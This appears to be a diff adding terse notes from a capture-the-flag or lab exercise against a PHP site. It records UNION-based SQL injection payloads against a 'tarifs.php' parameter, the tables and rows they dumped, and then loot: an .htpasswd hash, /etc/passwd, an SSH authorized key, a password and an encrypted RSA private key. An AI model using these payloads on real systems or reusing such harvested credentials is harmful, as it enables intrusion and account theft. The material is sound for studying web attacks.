@@ -1,0 +1,97 @@
+tarifs.php
+annee=2014 union select 1,table_name,3,4 from `information_schema`.`tables`
+
+coeur
+challenge
+tarif
+visites
+columns_priv
+db
+
+annee=2014 union select 1,nom,date,4 from visites
+
+john  2014-08-07
+willy 2014-09-16 !!!!!!!!!!!!!!!!
+david 2014-05-12
+max   2014-05-19
+
+User :
+challenge3@%
+
+Q22. www-data
+
+webshell:
+  md5 = a29014565bc6b652ec46f5da3c804f7f
+
+site/.htpasswd:
+admin:7YuBn1CR1qlxI
+
+/etc/passwd:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+mysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false
+
+/home/user/.ssh/authorized_keys :
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDeSMnK/mx064y4sp5+kdYmsD1sziUmRhPiBvMqhCrCdhTZC0d6si/ZP6mSDhd4Iz0mhE+5GjgpxPHDnH/qzuGl9xCsdSTf09pRwF1ugIifNzytOYNTv3w6dpqrfknYDsL7dm45m+hdAFvKwpD40C68sZmbtXTKhyPnCcnJoYP56scoW3i2LFMms4tLGqwUTxR3PjerzYjuQHOlN/D6c9UBLwCaTpyYzGd3zCCmYYT+eXrVInNBQRKmUr2K13Ltxp88qg9QwEkNZi/RNXSMrxXBXOMIPnmnx65g6MSOhstK0WITVhC2+NOQhv6wlzFE/FadVpntIT5udp8F8l3JH1jZ victor@zeus
+
+/home/user/ssh.tar:
+password.txt -->
+coucou
+
+id_rsa -->
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,4CED81F40CC70B41A2FA26448BA2FCDA
+
+xqem7XDkMR2Lp7QN50WnJKcoK6EnchTSsPYskUtBUIuvOQbYi0EiXlUOrRltCsho
+L2f5B/0yVwHt+XjNRsKrtY77y6z9y7p+hNjAaMGxVvJbTmD0BbcAWp5tvsXqvDs2
+B+gcJ/ghtACYFxBNoFn4/Dyofb15aeUZEOX2u7XTkbW/blltI21psnszIEEC1lWg
+Uj+0mgZEOMI8sWGs+Kw6WhoMNAhPsgjo9gHLM8W5Q3l7R0LV0mLNmlnZ3Gh0F8Xv
+V/qCsHLYL24G+tR4aUfimqnY+ZMpmwnHeY/8Ukihk/H/9g6LJVyNKzhVNqR0Obvr
+V3xzS2dwWMLXn2lQ1YH2zwrF3X2Lx0tQzP2h3Ds4dCbMKU4EPhPcBUmdPBByUtfN
+0Za6n1z8G6a7C3Ygas8bUU0NuSefZigQSB1G9rXIOXBuPvBkqNG/S+aZXqM/AnRe
+sdMsWfYOA6+mE2Lz1PrfeXDQfx1f2LgIYe7Rg5aQVRE0FWXZV+eyH6T65JJOHz5u
+Zfl6H5jx3OnErP79lq7gx27ZDBcBJA7RZP6n2mNeySxZBSwWvxYm1To+jir9CauY
+dChLgGcaPoFo4a21LFff6rQ7uDDB0sDzFeVVZeq85c3y/+fXoCVgAUarPVfluVhD
+X6Kd7qkVI8AoNRxrUygrYfXdaMu4sYQpCChAGuQmLHDS92rda9XIxvDuQyqOWUeW
+DpvGcvx3Z2JVqJ6N9TVb1YiDOQG1yDga6YyvM7hMh1YyAOwy0q633dGH3xlIIiI3
+F2GtvG4gueqQz30B2fqRQuxPyXv2iH5ofT4fSOU4k+Wvynrvl+JKzDFBJSUIivGN
+2ieaGKvKQexsduuusAB968bIwtqNO+VrtNs061BMzDXCT8LyV7kSaNyC7O5siMA4
+lFHiN2ZpvjUGK8VM6nx47Gc2lRi2Up+VrrrNNnP3OPT2/Nx6P3ATasojUw+LGuJB
+g9l3KBySVlh6fIuoQoUd4B2N3AqY0nVOiW3K7Pyv7jLiVqfLt2W4V/0Il2bUWJ/B
+eZkLKTQ9/a3VdFmxaFHfrv9OMAqsRzXrZHL/x0oXvWp/xAN5gzN8+iDweviqAvmh
+BiQYdVLLv9jhwnNy9H5pi+M5MWJyW/n2V+ge0C5XIpX/xrQ+lkFWLLWgr0kZI/5E
+GUUkd91uIJ35tZ1itZoXkWiOPmX4Ir+1KNtfGEpaLUfVl/uPqa0HAg87IO9bVPHn
+jOkveaixMKXWEkWhvme4sDvhO+1epBCJECJ0Nu68cKfyRpb4d+iYJq2M5cCQlyf2
+jeGAFNgUeRAZgwRe1rELUEn53ymXYo/1xyq5dKvzdVUNWcpICdLv51vkZ5yiUmJD
+QP4zp4pT5D0252XX7BgxrZt+/18QeJ+MujcuMvaZ/4EkVRN1ghAIaE8MtCeWEjUf
+nYDX/wcAR+Gy50eZjjbd0Hvxj2JNLyOwy8KCq1Gfc/1k67dSQeWYF2ADhqpTx8Pa
+ya5l9iIrPIbvuriOoAPArZevibg68oOY20WhqKvBAAyU/IhM55LvIACUDK1rE+6U
+JyIbI0Q8XQtt7+soeY4jxHnWai+1ye+dlGE61YudovAxafSuIIdGa3CXznc0v/ny
+-----END RSA PRIVATE KEY-----
